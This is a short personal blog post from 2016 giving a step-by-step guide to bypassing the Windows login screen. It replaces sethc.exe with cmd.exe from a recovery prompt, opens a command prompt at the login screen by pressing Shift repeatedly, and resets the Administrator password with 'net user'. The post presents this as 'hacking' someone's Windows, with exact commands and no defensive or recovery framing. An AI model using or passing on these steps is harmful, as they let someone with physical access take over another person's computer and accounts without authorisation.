---
layout: post
title:  "Bypass Windows Login (Hack Windows)"
date:   2016-05-12 08:35:38 +0530
categories: jekyll update
---
hey this is my first post on hacking windows, this was very fascinating to me when i first did it.
All you need in order to hack windows is
1)Windows bootable pendrive or bootable CD
2)Windows 10(recommended) or higher version than the one you wanna hack

step 1)Boot from your bootable pendrive
step 2)Go to Repair Computer option displayed at below left side

step 3)Choose Command prompt
step 4)navigate to the windows drive u wanna hack
lets say in my case D:
step 5)go to D://Windows/System32/

{% highlight ruby %}
D:
cd Windows/System32
{% endhighlight %}

There’s one file named sethc.exe which is responsible to open the dialog box of
stickey at time of windows login screen, what we are going to do is rename
our cmd.exe(command prompt) with sethc.exe.
this is will execute sethc.exe file which is nothing but our command prompt
because of we rename it with sethc.exe

{% highlight ruby %}
ren sethc.exe sethc.exe.bak
ren cmd.exe sethc.exe
{% endhighlight %}


there we go.
Its done now.

Normally open the windows at login screen and press shift key multiple times.
it will open command prompt for you.

step 6)Now time to reset the password of windows user

{% highlight ruby %}
net user
{% endhighlight %}

this command will show all the windows users list.

{% highlight ruby %}
net user Administrator *
{% endhighlight %}

this will prompt you for new password for Administrator.

Done!!
Now you can login to Administrator account with recently changed password by you